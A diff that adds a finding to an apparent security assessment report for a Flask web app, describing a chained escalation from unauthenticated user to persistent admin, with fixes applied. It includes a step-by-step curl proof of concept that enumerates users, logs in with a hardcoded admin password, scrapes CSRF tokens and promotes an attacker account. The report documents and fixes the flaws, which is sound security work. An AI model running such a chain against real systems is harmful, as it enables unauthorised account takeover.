@@ -347,6 +347,7 @@ Push / PR
 | VUL-08 | `DEBUG=True` in Production (Stack Trace Disclosure) | A05:2021 Security Misconfiguration | 5.3 | 🟡 Medium | SAST + Manual | Fixed |
 | VUL-09 | Missing `HttpOnly` / `Secure` Flags on Session Cookie | A05:2021 Security Misconfiguration | 5.4 | 🟡 Medium | DAST | Fixed |
 | VUL-10 | No Rate Limiting on `/login` and `/register` | A07:2021 Auth Failures | 4.3 | 🔵 Low | Manual | Fixed |
+| VUL-11 | Unauthenticated to Admin Escalation Chain | A07:2021 + A01:2021 | 9.3 | 🔴 Critical | Manual | Fixed |
 
 ---
 
@@ -559,6 +560,74 @@ return render_template_string(feedback.content)
 ---
 
 > *[VUL-07 through VUL-10: use the same template above, adjusting code and evidence per finding]*
+
+---
+
+#### VUL-11 — Unauthenticated to Admin Escalation Chain
+
+**OWASP Category:** A07:2021 + A01:2021 (Chained)
+**CWE Reference:** CWE-307, CWE-204, CWE-798 (Compound)
+**CVSS Score:** 9.3 (Critical)
+**CVSS Vector:** `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`
+**Detection Method:** Manual (multi-step chain)
+
+**Description:**
+VULN-001, VULN-005, and VULN-007 chain into a complete unauthenticated-to-admin-persistent-access attack.
+- VULN-005 (username enumeration) confirms the admin username exists
+- VULN-007 (hardcoded credentials) provides the password directly from source
+- VULN-001 (no rate limiting) enables brute force if the password is not already known
+
+Once admin access is obtained, the attacker promotes their own account to admin — maintaining persistent access even after the original password is rotated.
+
+**Proof of Concept:**
+```bash
+# ── Step 1: Enumerate valid usernames (VULN-005) ─────────────────────────────
+curl -s -X POST http://localhost:5000/register \
+  -d "username=admin&email=x@attacker.com&password=Pass1234&confirm_password=Pass1234" \
+  | grep "already registered"
+# ✓ confirms 'admin' exists
+
+# ── Step 2: Register attacker account ────────────────────────────────────────
+curl -s -c attacker.txt -X POST http://localhost:5000/register \
+  -d "username=attacker&email=attacker@evil.com&password=Attack1&confirm_password=Attack1"
+
+# ── Step 3: Login as admin using hardcoded credential (VULN-007) ──────────────
+CSRF=$(curl -s -c admin.txt http://localhost:5000/login \
+       | grep -o 'csrf_token" value="[^"]*"' | cut -d'"' -f3)
+
+curl -s -c admin.txt -b admin.txt -X POST http://localhost:5000/login \
+  -d "identifier=admin&password=Admin1234&csrf_token=$CSRF" \
+  | grep "Welcome back"
+# ✓ "Welcome back, admin."
+
+# ── Step 4: Identify attacker's user ID ──────────────────────────────────────
+curl -s -b admin.txt http://localhost:5000/admin \
+  | grep -i "attacker"
+# → <input type="hidden" name="user_id" value="4">
+
+# ── Step 5: Promote attacker to admin ────────────────────────────────────────
+CSRF2=$(curl -s -b admin.txt http://localhost:5000/admin \
+        | grep -o 'csrf_token" value="[^"]*"' | cut -d'"' -f3)
+
+curl -s -b admin.txt -X POST http://localhost:5000/admin \
+  -d "csrf_token=$CSRF2&user_id=4&role=admin"
+# ✓ "Role updated." — attacker is now a permanent admin
+
+# ── Step 6: Maintain access ───────────────────────────────────────────────────
+curl -b attacker.txt http://localhost:5000/admin
+# ✓ Full admin access even after original admin password is rotated
+```
+
+**Impact:**
+- Confidentiality: Critical — all user data, projects, tasks, and security feedback exposed
+- Integrity: Critical — persistent admin; can demote legitimate admins, delete all projects, read all submitted security reports
+- Availability: None direct (secondary: admin demotion of legitimate users)
+
+**Remediation Applied:**
+This chain was completely broken by fixing the constituent vulnerabilities:
+1. **VULN-001** — Implemented `Flask-Limiter` to rate limit `/login` and `/register`.
+2. **VULN-007** — Removed hardcoded credentials from `app.py` and sourced them from environment variables via Docker.
+3. **VULN-005** — Modified `/register` to return a generic success message instead of a duplicate user error.
 
 ---
 
